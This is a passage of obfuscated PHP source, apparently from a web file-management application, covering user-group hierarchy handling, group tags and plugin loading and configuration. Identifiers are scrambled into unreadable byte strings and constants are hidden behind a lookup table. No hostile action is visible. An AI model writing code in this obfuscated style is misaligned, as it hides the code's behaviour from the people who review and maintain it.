$_SERVER[ú÷îèÆÜ]; $‰±º§ñˆ = strtolower($‰±º§ñˆ); $Îµ“†Ú¦ = array($õşËÍ·Ò[104] => $å©½ÑŸû, $õşËÍ·Ò[427] => array($õşËÍ·Ò[436], "\x25{$‰±º§ñˆ}\45")); $Îµ“†Ú¦ = $this->parseWhereLike($Îµ“†Ú¦); if ($é¼´Œ§µ) { $Îµ“†Ú¦[$õşËÍ·Ò[1883]] = array($õşËÍ·Ò[17], $é¼´Œ§µ); } $³¬Ÿ¶Õ† = Model($õşËÍ·Ò[1982])->where($Îµ“†Ú¦)->limit($óÇÖÌÉ§)->select(); if (!$³¬Ÿ¶Õ†) { return array(); } $³¬Ÿ¶Õ† = array_to_keyvalue($³¬Ÿ¶Õ†, $õşËÍ·Ò[22], $õşËÍ·Ò[1883]); $šÖ¿±èå = $this->where(array($õşËÍ·Ò[1971] => array($õşËÍ·Ò[17], $³¬Ÿ¶Õ†)))->select(); if (!$šÖ¿±èå) { return array(); } return $šÖ¿±èå; } protected function _listDataApplyItem($şŠ–Å„) { $û…àÚ• = array($şŠ–Å„); $this->_listDataApply($û…àÚ•); return $û…àÚ•[0]; } protected function _listDataApply(&$ã¡êºõ¨) { $£¹¸İ¢Î =& $_SERVER[ú÷îèÆÜ]; if (!$ã¡êºõ¨) { return; } $âÌœºÑ¡ = array_to_keyvalue($ã¡êºõ¨, $£¹¸İ¢Î[22], $£¹¸İ¢Î[1883]); $this->_listAppendChildren($ã¡êºõ¨); $this->_listAppendChildrenMember($ã¡êºõ¨); $this->_listAppendMeta($ã¡êºõ¨, $âÌœºÑ¡); $this->_listAppendParent($ã¡êºõ¨); $this->_listAppendSourceRoot($ã¡êºõ¨, $âÌœºÑ¡); } private function _listAppendChildren(&$¶±…ŠıÚ) { $âÂ¼øÏ¨ =& $_SERVER[ú÷îèÆÜ]; $İõÉÕ = array_to_keyvalue($¶±…ŠıÚ, $âÂ¼øÏ¨[22], $âÂ¼øÏ¨[1883]); $ö®¾ú¶Ø = array($âÂ¼øÏ¨[190] => array($âÂ¼øÏ¨[17], $İõÉÕ)); $–Èğîí© = array($âÂ¼øÏ¨[190], $âÂ¼øÏ¨[1983] => $âÂ¼øÏ¨[542]); $Ğš­¸Úª = $this->field($–Èğîí©)->where($ö®¾ú¶Ø)->group($âÂ¼øÏ¨[190])->select(); $äòÉ¦¼ = array_to_keyvalue($Ğš­¸Úª, $âÂ¼øÏ¨[190], $âÂ¼øÏ¨[542]); foreach ($¶±…ŠıÚ as &$ÇéëŠ¥×) { $ûÒ¹˜Ø = $ÇéëŠ¥×[$âÂ¼øÏ¨[1883]]; $ÇéëŠ¥×[$âÂ¼øÏ¨[1984]] = isset($äòÉ¦¼[$ûÒ¹˜Ø]) ? intval($äòÉ¦¼[$ûÒ¹˜Ø]) : !1; } unset($ÇéëŠ¥×); } private function _listAppendChildrenMember(&$ó§¿º²–) { $ÀÌ¾Ø¼ =& $_SERVER[ú÷îèÆÜ]; $ƒà£İ„Ä = array_to_keyvalue($ó§¿º²–, $ÀÌ¾Ø¼[22], $ÀÌ¾Ø¼[1883]); $¬†ê„Ğç = array($ÀÌ¾Ø¼[1883] => array($ÀÌ¾Ø¼[17], $ƒà£İ„Ä)); $¶ô˜Ñ´û = array($ÀÌ¾Ø¼[1883], $ÀÌ¾Ø¼[1983] => $ÀÌ¾Ø¼[542]); $´ğÄéÄ¦ = Model($ÀÌ¾Ø¼[1973])->field($¶ô˜Ñ´û)->where($¬†ê„Ğç)->group($ÀÌ¾Ø¼[1883])->select(); $Ğ¯ËğÌñ = array_to_keyvalue($´ğÄéÄ¦, $ÀÌ¾Ø¼[1883], $ÀÌ¾Ø¼[542]); foreach ($ó§¿º²– as &$œÔ¬ğ‘¸) { $áˆ••àÉ = $œÔ¬ğ‘¸[$ÀÌ¾Ø¼[1883]]; $œÔ¬ğ‘¸[$ÀÌ¾Ø¼[1985]] = isset($Ğ¯ËğÌñ[$áˆ••àÉ]) ? intval($Ğ¯ËğÌñ[$áˆ••àÉ]) : !1; } unset($œÔ¬ğ‘¸); } private function _listAppendMeta(&$­Äô˜Ñ, $®î£õ‚É) { $Àîâø =& $_SERVER[ú÷îèÆÜ]; $Ú³õé‡— = array($Àîâø[1883] => array($Àîâø[17], $®î£õ‚É)); $¾Óû¾¬° = Model($Àîâø[1972])->where($Ú³õé‡—)->select(); $¾Óû¾¬° = array_to_keyvalue_group($¾Óû¾¬°, $Àîâø[1883]); foreach ($¾Óû¾¬° as &$£ÌşóÕ) { $£ÌşóÕ = array_to_keyvalue($£ÌşóÕ, $Àîâø[104], $Àîâø[427]); } unset($£ÌşóÕ); foreach ($­Äô˜Ñ as &$ÛÎ‚ášË) { $ÛÎ‚ášË[$Àîâø[516]] = array(); if (isset($¾Óû¾¬°[$ÛÎ‚ášË[$Àîâø[1883]]])) { $ÛÎ‚ášË[$Àîâø[516]] = $¾Óû¾¬°[$ÛÎ‚ášË[$Àîâø[1883]]]; } } unset($ÛÎ‚ášË); } protected function parentLevelArray($›©Îó ·) { $´ç¬òˆ¨ =& $_SERVER[ú÷îèÆÜ]; $›©Îó · = explode($´ç¬òˆ¨[60], trim($›©Îó ·, $´ç¬òˆ¨[60])); $›©Îó · = array_remove_value($›©Îó ·, $´ç¬òˆ¨[222]); return $›©Îó ·; } protected function parentInGroup($ûß—­òé, $¡ÛœÎ—à) { $éÂÕ‘ºÌ =& $_SERVER[ú÷îèÆÜ]; $€¤¢¯†š = $this->getInfoSimple($ûß—­òé); if (!$€¤¢¯†š) { return !0; } $§éƒœö = $this->parentLevelArray($€¤¢¯†š[$éÂÕ‘ºÌ[562]]); $§éƒœö[] = $ûß—­òé; foreach ($§éƒœö as $ûß—­òé) { if (in_array($ûß—­òé . $éÂÕ‘ºÌ[22], $¡ÛœÎ—à)) { return !0; } } return !1; } private function _listAppendParent(&$Ÿ»©±äü) { $–ıöŠ«Ş =& $_SERVER[ú÷îèÆÜ]; $ Ş½™ÙÊ = array(); foreach ($Ÿ»©±äü as &$¼—ãßÑ¸) { $ Ş½™ÙÊ[$¼—ãßÑ¸[$–ıöŠ«Ş[1883]]] = $¼—ãßÑ¸[$–ıöŠ«Ş[42]]; $„û¦ÚÓ = $this->parentLevelArray($¼—ãßÑ¸[$–ıöŠ«Ş[562]]); foreach ($„û¦ÚÓ as $ºææ†ö) { if (!isset($ Ş½™ÙÊ[$ºææ†ö])) { $ Ş½™ÙÊ[$ºææ†ö] = 0; } } } unset($¼—ãßÑ¸); foreach ($ Ş½™ÙÊ as $§ÇÖ˜Æ => $£Ï¾Éß·) { if ($£Ï¾Éß·) { continue; } $àš¯ğÙª = $this->getInfoSimple($§ÇÖ˜Æ); $ Ş½™ÙÊ[$§ÇÖ˜Æ] = $àš¯ğÙª[$–ıöŠ«Ş[42]]; } $ÏõâáËÇ = $GLOBALS[$–ıöŠ«Ş[16]][$–ıöŠ«Ş[99]][$–ıöŠ«Ş[1986]]; if ($GLOBALS[$–ıöŠ«Ş[545]] == $–ıöŠ«Ş[98]) { $ÏõâáËÇ = !1; } foreach ($Ÿ»©±äü as &$¼—ãßÑ¸) { $„û¦ÚÓ = $this->parentLevelArray($¼—ãßÑ¸[$–ıöŠ«Ş[562]]); $ÔçÄ”¸” = $–ıöŠ«Ş[22]; foreach ($„û¦ÚÓ as $§ÇÖ˜Æ => $ºææ†ö) { if ($ÏõâáËÇ && $§ÇÖ˜Æ == 0) { continue; } $ÔçÄ”¸” .= $ Ş½™ÙÊ[$ºææ†ö] . $–ıöŠ«Ş[18]; } if ($„û¦ÚÓ) { $ÔçÄ”¸” .= $¼—ãßÑ¸[$–ıöŠ«Ş[42]]; } $¼—ãßÑ¸[$–ıöŠ«Ş[567]] = str_replace($–ıöŠ«Ş[570], $–ıöŠ«Ş[18], $ÔçÄ”¸”); } unset($¼—ãßÑ¸); } private function _listAppendSourceRoot(&$„»ßã˜, $ùİì€Ÿñ) { $êşÛ—¡ =& $_SERVER[ú÷îèÆÜ]; $– ””Õ¹ = Model($êşÛ—¡[865])->listSourceRoot(SourceModel::TYPE_GROUP, $ùİì€Ÿñ); $– ””Õ¹ = array_to_keyvalue($– ””Õ¹, $êşÛ—¡[547]); $– ””Õ¹ = array_remove_key($– ””Õ¹, $êşÛ—¡[547]); foreach ($„»ßã˜ as &$‡×ğÌÚ) { $‡×ğÌÚ[$êşÛ—¡[97]] = $– ””Õ¹[$‡×ğÌÚ[$êşÛ—¡[1883]]] ? $– ””Õ¹[$‡×ğÌÚ[$êşÛ—¡[1883]]] : array(); } unset($‡×ğÌÚ); } protected function groupMerge($¥”·ì°) { $¥”·ì° = array_values(array_unique($¥”·ì°)); $†¦Ò“ŸÜ = array(); for ($Ù²¨‹Õ = 0; $Ù²¨‹Õ < count($¥”·ì°); $Ù²¨‹Õ++) { $ØôöëŒ = !1; for ($Ç€¶šõÍ = 0; $Ç€¶šõÍ < count($¥”·ì°); $Ç€¶šõÍ++) { if ($Ù²¨‹Õ == $Ç€¶šõÍ) { continue; } if ($this->isParentOf($¥”·ì°[$Ç€¶šõÍ], $¥”·ì°[$Ù²¨‹Õ])) { $ØôöëŒ = !0; break; } } if (!$ØôöëŒ) { $†¦Ò“ŸÜ[] = $¥”·ì°[$Ù²¨‹Õ]; } } return $†¦Ò“ŸÜ; } protected function isParentOf($†€“³™, $åñŒ²°ó) { $…ÌŞşÍ =& $_SERVER[ú÷îèÆÜ]; if (!$†€“³™ || !$åñŒ²°ó || $†€“³™ == $åñŒ²°ó) { return !1; } $¤Ëô´Œƒ = $this->getInfoSimple($†€“³™); $ Æ‰÷Ş¤ = $this->getInfoSimple($åñŒ²°ó); $Ş€©–¸ˆ = $¤Ëô´Œƒ[$…ÌŞşÍ[562]] . $†€“³™ . $…ÌŞşÍ[60]; if (substr($ Æ‰÷Ş¤[$…ÌŞşÍ[562]], 0, strlen($Ş€©–¸ˆ)) == $Ş€©–¸ˆ) { return !0; } return !1; } public function groupShowRoot($»ºÍ€·É, $ø˜ÌÎ· = false) { $ıĞÇİ¶ =& $_SERVER[ú÷îèÆÜ]; $ÀÑ‹âŸ = $this->getInfo($»ºÍ€·É); if (!$ÀÑ‹âŸ) { return array(); } $áé°®æ© = $this->parentLevelArray($ÀÑ‹âŸ[$ıĞÇİ¶[562]]); $¶æñòÊ = array($»ºÍ€·É); if (count($áé°®æ©) == 0) { return $¶æñòÊ; } if ($ø˜ÌÎ· && count($áé°®æ©) == 1) { return $¶æñòÊ; } if (!$ÀÑ‹âŸ[$ıĞÇİ¶[516]] || !isset($ÀÑ‹âŸ[$ıĞÇİ¶[516]][$ıĞÇİ¶[1969]]) || $ÀÑ‹âŸ[$ıĞÇİ¶[516]][$ıĞÇİ¶[1969]] == $ıĞÇİ¶[1938]) { return $this->groupShowRoot($áé°®æ©[count($áé°®æ©) - 1], $ø˜ÌÎ·); } if ($ÀÑ‹âŸ[$ıĞÇİ¶[516]][$ıĞÇİ¶[1969]] == $ıĞÇİ¶[410]) { $—ÈÑ÷À¨ = explode($ıĞÇİ¶[60], $ÀÑ‹âŸ[$ıĞÇİ¶[516]][$ıĞÇİ¶[1970]]); if ($—ÈÑ÷À¨) { $¶æñòÊ = array_merge($¶æñòÊ, $—ÈÑ÷À¨); } } return $¶æñòÊ; } protected function resetParentLevel() { $‰íÑ´°³ =& $_SERVER[ú÷îèÆÜ]; $í÷¿é‡° = $‰íÑ´°³[1883]; $­Î½­  = $this->select(); $­Î½­  = array_to_keyvalue($­Î½­ , $í÷¿é‡°); foreach ($­Î½­  as $ëº„‚Ä) { $ä¯ŒÅ²¸ = $ëº„‚Ä; $·ùî‰”¡ = array(); while ($ä¯ŒÅ²¸[$‰íÑ´°³[190]] != 0) { $·ùî‰”¡[] = $ä¯ŒÅ²¸[$‰íÑ´°³[190]]; $ä¯ŒÅ²¸ = $­Î½­ [$ä¯ŒÅ²¸[$‰íÑ´°³[190]]]; } $·ùî‰”¡[] = 0; $·ùî‰”¡ = $‰íÑ´°³[60] . implode($‰íÑ´°³[60], array_reverse($·ùî‰”¡)) . $‰íÑ´°³[60]; $this->setNamePinyin($ëº„‚Ä[$í÷¿é‡°], $ëº„‚Ä[$‰íÑ´°³[42]]); $this->where(array($í÷¿é‡° => $ëº„‚Ä[$í÷¿é‡°]))->save(array($‰íÑ´°³[629] => $·ùî‰”¡)); } return $­Î½­ ; } public function groupNameAuto($ÁäğÜé, $½õ³¡ä¤) { $ ƒ‹¢ò =& $_SERVER[ú÷îèÆÜ]; $ÂşÉúÒ¨ = $this->where(array($ ƒ‹¢ò[454] => $ÁäğÜé))->getField($ ƒ‹¢ò[42], !0); if (!$ÂşÉúÒ¨ || !in_array($½õ³¡ä¤, $ÂşÉúÒ¨)) { return $½õ³¡ä¤; } for ($€âá¡å¦ = 1; $€âá¡å¦ <= count($ÂşÉúÒ¨) + 1; $€âá¡å¦++) { $¢ñÖ’ìä = $½õ³¡ä¤ . "\x28{$€âá¡å¦}\x29"; if (!in_array($¢ñÖ’ìä, $ÂşÉúÒ¨)) { return $¢ñÖ’ìä; } } } public function groupSwitch($¾—£Ó¿´, $¥ı™Ğ±) { $¬·œ±Ò« =& $_SERVER[ú÷îèÆÜ]; $‹—òÄüÕ = array($¬·œ±Ò«[1883] => array($¬·œ±Ò«[17], array($¾—£Ó¿´, $¥ı™Ğ±))); $‰óüÑÀˆ = $this->where($‹—òÄüÕ)->select(); $‰óüÑÀˆ = array_to_keyvalue($‰óüÑÀˆ, $¬·œ±Ò«[1883]); if (!isset($‰óüÑÀˆ[$¾—£Ó¿´]) || !isset($‰óüÑÀˆ[$¥ı™Ğ±]) || $‰óüÑÀˆ[$¾—£Ó¿´][$¬·œ±Ò«[190]] == 0) { return !1; } $‹—òÄüÕ = array($¬·œ±Ò«[1883] => $¾—£Ó¿´); $¨‘œà©Ï = Model($¬·œ±Ò«[1973])->where($‹—òÄüÕ)->select(); if (!$¨‘œà©Ï) { $¨‘œà©Ï = array(); } foreach ($¨‘œà©Ï as $Ì†­”§ü) { $±¬†½×ë = $Ì†­”§ü[$¬·œ±Ò«[1685]]; $‹—òÄüÕ = array($¬·œ±Ò«[1685] => $±¬†½×ë, $¬·œ±Ò«[1883] => $¥ı™Ğ±); $«ËíÎØÃ = Model($¬·œ±Ò«[1973])->where($‹—òÄüÕ)->find(); if (!$«ËíÎØÃ) { $¯¢ÜíÂë = array($¥ı™Ğ± => $Ì†­”§ü[$¬·œ±Ò«[1987]]); Model($¬·œ±Ò«[576])->userGroupAdd($±¬†½×ë, $¯¢ÜíÂë); } Model($¬·œ±Ò«[576])->userGroupRemove($±¬†½×ë, $¾—£Ó¿´); } $‹—òÄüÕ = array($¬·œ±Ò«[188] => 2, $¬·œ±Ò«[190] => 0, $¬·œ±Ò«[462] => 1, $¬·œ±Ò«[547] => array($¬·œ±Ò«[17], array($¾—£Ó¿´, $¥ı™Ğ±))); $¶’–ì›õ = Model($¬·œ±Ò«[865])->where($‹—òÄüÕ)->field($¬·œ±Ò«[1988])->select(); $¶’–ì›õ = array_to_keyvalue($¶’–ì›õ, $¬·œ±Ò«[547], $¬·œ±Ò«[191]); $™ÊÔªã = !empty($¶’–ì›õ[$¾—£Ó¿´]) ? $¶’–ì›õ[$¾—£Ó¿´] : !1; if ($™ÊÔªã) { if (!$¶’–ì›õ[$¥ı™Ğ±]) { $¶’–ì›õ[$¥ı™Ğ±] = Model($¬·œ±Ò«[865])->groupRootAdd($¥ı™Ğ±); } $÷ìğ¹°› = $¶’–ì›õ[$¥ı™Ğ±]; $‹—òÄüÕ = array($¬·œ±Ò«[190] => $™ÊÔªã); $¶’–ì›õ = Model($¬·œ±Ò«[865])->where($‹—òÄüÕ)->field($¬·œ±Ò«[1989])->select(); if (!$¶’–ì›õ) { $¶’–ì›õ = array(); } Model($¬·œ±Ò«[865])->moveClearAuth = !1; foreach ($¶’–ì›õ as $¥‘ØëÒ¬) { $©ÈÕæ¬ = $¥‘ØëÒ¬[$¬·œ±Ò«[462]] == $¬·œ±Ò«[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¬·œ±Ò«[865])->move($¥‘ØëÒ¬[$¬·œ±Ò«[191]], $÷ìğ¹°›, $©ÈÕæ¬); } Model($¬·œ±Ò«[865])->moveClearAuth = !0; $‹—òÄüÕ = array($¬·œ±Ò«[188] => 2, $¬·œ±Ò«[547] => $¾—£Ó¿´); $éñ¶¸º¢ = array($¬·œ±Ò«[547] => $¥ı™Ğ±); Model($¬·œ±Ò«[1990])->where($‹—òÄüÕ)->save($éñ¶¸º¢); Model($¬·œ±Ò«[1991])->where($‹—òÄüÕ)->save($éñ¶¸º¢); } $this->_changeChildLevel($‰óüÑÀˆ[$¾—£Ó¿´], $‰óüÑÀˆ[$¥ı™Ğ±], !0); $this->where(array($¬·œ±Ò«[190] => $¾—£Ó¿´))->save(array($¬·œ±Ò«[190] => $¥ı™Ğ±)); $this->_clearChildrenCache($‰óüÑÀˆ[$¥ı™Ğ±]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($¾÷² šĞ) { $®ğÚµ™ =& $_SERVER[ú÷îèÆÜ]; return array($®ğÚµ™[1992] => array($¾÷² šĞ[0], $®ğÚµ™[1993]), $®ğÚµ™[1994] => array($¾÷² šĞ[0], $®ğÚµ™[1995])); } protected function get($Òóá€ïÁ) { $¹ÕåŒÃå =& $_SERVER[ú÷îèÆÜ]; $›æ‹·Àª = Model($¹ÕåŒÃå[563])->metaGet($Òóá€ïÁ, $¹ÕåŒÃå[1996]); $ÌÎİã¾ = json_decode($›æ‹·Àª, !0); return $ÌÎİã¾ ? $ÌÎİã¾ : array($¹ÕåŒÃå[1997] => $¹ÕåŒÃå[98], $¹ÕåŒÃå[422] => array()); } protected function set($ûƒÀş±, $ÅÖÈ¤×ò) { $¦”‡«¤ğ =& $_SERVER[ú÷îèÆÜ]; $ÅÖÈ¤×ò = $ÅÖÈ¤×ò ? $ÅÖÈ¤×ò : array($¦”‡«¤ğ[1997] => $¦”‡«¤ğ[98], $¦”‡«¤ğ[422] => array()); return Model($¦”‡«¤ğ[563])->metaSet($ûƒÀş±, $¦”‡«¤ğ[1996], json_encode($ÅÖÈ¤×ò)); } protected function getByTagID($ÙĞ‘Ö°±, $èşñ‰‡Ø) { $¨Àá÷‡ó =& $_SERVER[ú÷îèÆÜ]; if (!$ÙĞ‘Ö°± || !$èşñ‰‡Ø) { return !1; } if (!Model($¨Àá÷‡ó[563])->getInfoSimple($ÙĞ‘Ö°±)) { return !1; } $Şˆ³ƒÛ = $this->get($ÙĞ‘Ö°±); if (!$Şˆ³ƒÛ || !isset($Şˆ³ƒÛ[$¨Àá÷‡ó[422]])) { return !1; } $ÎœÌçÖÎ = array_find_by_field($Şˆ³ƒÛ[$¨Àá÷‡ó[422]], $¨Àá÷‡ó[452], $èşñ‰‡Ø); return is_array($ÎœÌçÖÎ) ? $ÎœÌçÖÎ : !1; } public function listSource($• éèƒ­, $çä†âĞÌ) { $®¢‡²ºÜ =& $_SERVER[ú÷îèÆÜ]; if ($çä†âĞÌ && !is_array($çä†âĞÌ)) { $çä†âĞÌ = array($çä†âĞÌ); } $„ÛéÉ® = $this->listData($• éèƒ­); $à·‡µ¿² = array(); foreach ($„ÛéÉ® as $¶İù¶ Â) { $¿²Â¦ƒ = $¶İù¶ Â[$®¢‡²ºÜ[94]]; if (!$¿²Â¦ƒ) { continue; } if (!isset($à·‡µ¿²[$¿²Â¦ƒ])) { $à·‡µ¿²[$¿²Â¦ƒ] = array(); } $à·‡µ¿²[$¿²Â¦ƒ][] = $¶İù¶ Â[$®¢‡²ºÜ[477]]; } $£ª·‚çŞ = array(); foreach ($à·‡µ¿² as $’¢ÒÕôñ => $‹Ö÷„Øà) { $ƒØ´Æ¸ = !0; if (!$çä†âĞÌ) { $£ª·‚çŞ[] = $’¢ÒÕôñ; continue; } foreach ($çä†âĞÌ as $ŠğŠ£”±) { if (!in_array($ŠğŠ£”±, $‹Ö÷„Øà)) { $ƒØ´Æ¸ = !1; break; } } if ($ƒØ´Æ¸) { $£ª·‚çŞ[] = $’¢ÒÕôñ; } } if (!$£ª·‚çŞ) { return array(); } $æÅ…§Ó¼ = array($®¢‡²ºÜ[468] => array($®¢‡²ºÜ[469], $£ª·‚çŞ), $®¢‡²ºÜ[547] => $• éèƒ­, $®¢‡²ºÜ[188] => SourceModel::TYPE_GROUP); $¸ø¿–Àü = Model($®¢‡²ºÜ[1373])->listSource($æÅ…§Ó¼); if (!$¸ø¿–Àü || count($£ª·‚çŞ) == $¸ø¿–Àü[$®¢‡²ºÜ[419]][$®¢‡²ºÜ[420]]) { return $¸ø¿–Àü; } $± ãËÄ¶ = array(); $òèÎº®´ = array_to_keyvalue($¸ø¿–Àü[$®¢‡²ºÜ[92]], $®¢‡²ºÜ[22], $®¢‡²ºÜ[191]); $Ì«Ø®× = array_to_keyvalue($¸ø¿–Àü[$®¢‡²ºÜ[93]], $®¢‡²ºÜ[22], $®¢‡²ºÜ[191]); $áÒé³—é = array_merge($Ì«Ø®×, $òèÎº®´); foreach ($£ª·‚çŞ as $¿²Â¦ƒ) { if (!in_array($¿²Â¦ƒ, $áÒé³—é)) { $± ãËÄ¶[] = $¿²Â¦ƒ; } } if ($± ãËÄ¶) { $this->removeBySource($• éèƒ­, $± ãËÄ¶); } return $¸ø¿–Àü; } protected function listData($’Ûßàí±) { $œÉœæ¯ =& $_SERVER[ú÷îèÆÜ]; $€¨ÎÀ” = array($œÉœæ¯[1676] => 0, $œÉœæ¯[534] => array($œÉœæ¯[1998], 0), $œÉœæ¯[473] => $œÉœæ¯[1999] . $’Ûßàí±); $áºÚ¤‰¤ = $œÉœæ¯[2000]; $Ú­ÔµÅ“ = $this->field($áºÚ¤‰¤)->where($€¨ÎÀ”)->order($œÉœæ¯[2001])->select(); return $Ú­ÔµÅ“ ? $Ú­ÔµÅ“ : array(); } protected function addToTag($ÏÕŞ²È¡, $Ö«¬Õì, $şÖ˜Ö÷œ) { $î´”°ºª =& $_SERVER[ú÷îèÆÜ]; if (!$this->getByTagID($ÏÕŞ²È¡, $şÖ˜Ö÷œ) || !$Ö«¬Õì) { return !1; } if (!Model($î´”°ºª[865])->pathInfo($Ö«¬Õì)) { return !1; } $êß¬Ü²¯ = array($î´”°ºª[1676] => 0, $î´”°ºª[534] => $şÖ˜Ö÷œ, $î´”°ºª[472] => $Ö«¬Õì, $î´”°ºª[473] => $î´”°ºª[2002] . $ÏÕŞ²È¡, $î´”°ºª[471] => $î´”°ºª[22], $î´”°ºª[1887] => 0); if ($this->where($êß¬Ü²¯)->find()) { return !1; } return $this->add($êß¬Ü²¯); } protected function removeFromTag($æˆ¬ïÚƒ, $ëÔ—€÷ë, $ÚëŞœò¶) { $ğ†í‡„ =& $_SERVER[ú÷îèÆÜ]; if (!$this->getByTagID($æˆ¬ïÚƒ, $ÚëŞœò¶) || !$ëÔ—€÷ë) { return !1; } if (is_array($ëÔ—€÷ë)) { $ëÔ—€÷ë = array($ğ†í‡„[17], $ëÔ—€÷ë); } $é‰ıŒ¾Û = array($ğ†í‡„[1676] => 0, $ğ†í‡„[534] => $ÚëŞœò¶, $ğ†í‡„[473] => $ğ†í‡„[2002] . $æˆ¬ïÚƒ, $ğ†í‡„[472] => $ëÔ—€÷ë); return $this->where($é‰ıŒ¾Û)->delete(); } protected function removeByTag($ØˆËôØî, $‡¤öÜÏ) { $»Åğ¾Íè =& $_SERVER[ú÷îèÆÜ]; if (!$this->getByTagID($ØˆËôØî, $‡¤öÜÏ)) { return !1; } $¿ïã¯À¨ = array($»Åğ¾Íè[1676] => 0, $»Åğ¾Íè[534] => $‡¤öÜÏ, $»Åğ¾Íè[473] => $»Åğ¾Íè[2002] . $ØˆËôØî); return $this->where($¿ïã¯À¨)->delete(); } protected function removeBySource($†–ïœ¯¹, $Ş²³•«¿) { $©òú”û· =& $_SERVER[ú÷îèÆÜ]; if (!$†–ïœ¯¹ || !$Ş²³•«¿) { return !1; } if (is_array($Ş²³•«¿)) { $Ş²³•«¿ = array($©òú”û·[17], $Ş²³•«¿); } $şìÏÈóÇ = array($©òú”û·[1676] => 0, $©òú”û·[472] => $Ş²³•«¿, $©òú”û·[534] => array($©òú”û·[1055], 0), $©òú”û·[473] => $©òú”û·[2002] . $†–ïœ¯¹); return $this->where($şìÏÈóÇ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\x70\154\165\x67\x69\x6e\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x73\164\141\x74\165\163", "\162\145\x67\x69\145\x73\164", "\x63\x6f\x6e\146\151\147"); public function loadList($»’‹ù¯ = false) { $Óç®Ïñ­ = array_to_keyvalue($this->listData(), $_SERVER[ú÷îèÆÜ][42]); if ($»’‹ù¯) { return $Óç®Ïñ­[$»’‹ù¯]; } return $Óç®Ïñ­; } public function init() { $ƒ»Éû =& $_SERVER[ú÷îèÆÜ]; Hook::trigger($ƒ»Éû[2003]); $›øİêñ¨ = $this->loadPluginList(); foreach ($›øİêñ¨ as $üÅ“ÓÔ– => $Ç‚•›ƒÈ) { $ô§ÕÏ = $this->appAllow($üÅ“ÓÔ–, $Ç‚•›ƒÈ); if (!$ô§ÕÏ) { continue; } foreach ($Ç‚•›ƒÈ[$ƒ»Éû[2004]] as $Š­õå«¥ => $Ú£êÓÄ«) { Hook::bind($Š­õå«¥, $Ú£êÓÄ«); } } Hook::trigger($ƒ»Éû[2005]); Hook::trigger(ACTION); } public function appAllow($Èôü¶Úã, $ºø³ŒİÊ, $ºáÔĞÒå = true) { $ìœù¬ãš =& $_SERVER[ú÷îèÆÜ]; $Ü¿ÆÄÏˆ = PLUGIN_DIR . $Èôü¶Úã . $ìœù¬ãš[2006]; if (!is_array($ºø³ŒİÊ) || !is_array($ºø³ŒİÊ[$ìœù¬ãš[2004]]) || $ºø³ŒİÊ[$ìœù¬ãš[790]] != 1 || !is_file($Ü¿ÆÄÏˆ)) { return !1; } if ($GLOBALS[$ìœù¬ãš[545]] == 1) { if ($GLOBALS[$ìœù¬ãš[16]][$ìœù¬ãš[2007]] || !$GLOBALS[$ìœù¬ãš[16]][$ìœù¬ãš[2008]]) { return !0; } $éÄí°Òò = explode($ìœù¬ãš[60], strtolower($GLOBALS[$ìœù¬ãš[16]][$ìœù¬ãš[2008]])); return in_array(strtolower($Èôü¶Úã), $éÄí°Òò) ? !1 : !0; } if ($ºáÔĞÒå && !Action($ìœù¬ãš[2009])->checkAuth($Èôü¶Úã)) { return !1; } return !0; } public function unInstall($÷ùš×àÁ) { $ã¡³Ëº =& $_SERVER[ú÷îèÆÜ]; $•”©ÄÑ“ = $this->loadList($÷ùš×àÁ); if (file_exists(PLUGIN_DIR . $÷ùš×àÁ)) { Hook::apply($÷ùš×àÁ . $ã¡³Ëº[2010]); } $this->remove($•”©ÄÑ“[$ã¡³Ëº[452]]); } public function changeStatus($ÌÀºŠô¾, $ìóÉ—±È) { $ş‘ Ò¢ş =& $_SERVER[ú÷îèÆÜ]; $šë’¿˜ = $this->loadList($ÌÀºŠô¾); if ($ìóÉ—±È) { Hook::apply($ÌÀºŠô¾ . $ş‘ Ò¢ş[2011]); } $this->update($šë’¿˜[$ş‘ Ò¢ş[452]], array($ş‘ Ò¢ş[2012] => $ìóÉ—±È)); } public function appRegist($°ªë˜ã×, $öÖ©ºĞ) { $û™İ½–¥ =& $_SERVER[ú÷îèÆÜ]; $Šú÷Œ­¿ = $this->loadList($°ªë˜ã×); if ($Šú÷Œ­¿) { $this->update($Šú÷Œ­¿[$û™İ½–¥[452]], array($û™İ½–¥[2004] => $öÖ©ºĞ)); } else { $­´ô©’å = array($û™İ½–¥[42] => $°ªë˜ã×, $û™İ½–¥[2004] => $öÖ©ºĞ, $û™İ½–¥[790] => 0, $û™İ½–¥[16] => $this->getConfigDefault($°ªë˜ã×)); $this->insert($­´ô©’å); } } public function getConfigDefault($¸ò‹÷¤â) { $–“¬ë· =& $_SERVER[ú÷îèÆÜ]; $”Úì‘ëƒ = array(); $Ê‘¸ïóÎ = $this->getPackageJson($¸ò‹÷¤â); if (!$Ê‘¸ïóÎ && is_array($Ê‘¸ïóÎ[$–“¬ë·[2013]])) { return $”Úì‘ëƒ; } foreach ($Ê‘¸ïóÎ[$–“¬ë·[2013]] as $®ÚŸê—‚ => $ĞŸ¥ÖßÂ) { if (!isset($ĞŸ¥ÖßÂ[$–“¬ë·[427]]) || isset($”Úì‘ëƒ[$®ÚŸê—‚])) { continue; } $”Úì‘ëƒ[$®ÚŸê—‚] = $ĞŸ¥ÖßÂ[$–“¬ë·[427]]; } return $”Úì‘ëƒ; } public function getPackageJson($ñ¿Õ¼ø) { return Hook::apply($ñ¿Õ¼ø . $_SERVER[ú÷îèÆÜ][2014]); } public function getConfig($²ùĞÌÉ¼, $¹¶Å‰… = false) { $ØÕî˜ =& $_SERVER[ú÷îèÆÜ]; $«È³ì¹ = array(); $é¿¢­–´ = $this->loadList($²ùĞÌÉ¼); if ($é¿¢­–´ && is_array($é¿¢­–´[$ØÕî˜[16]])) { $«È³ì¹ = $é¿¢­–´[$ØÕî˜[16]]; } if (!$«È³ì¹ || $¹¶Å‰…) { $«È³ì¹ = $this->getConfigDefault($²ùĞÌÉ¼); } return $«È³ì¹; } public function setConfig($¥Ê¶£òÃ, $ú¤’…½Ğ = false) { $©î” =& $_SERVER[ú÷îèÆÜ]; $ù¯è¦»Ñ = $this->loadList($¥Ê¶£òÃ); if (!$ù¯è¦»Ñ) { return !1; } $á›ãñø‹ = $ù¯è¦»Ñ[$©î”[16]]; if 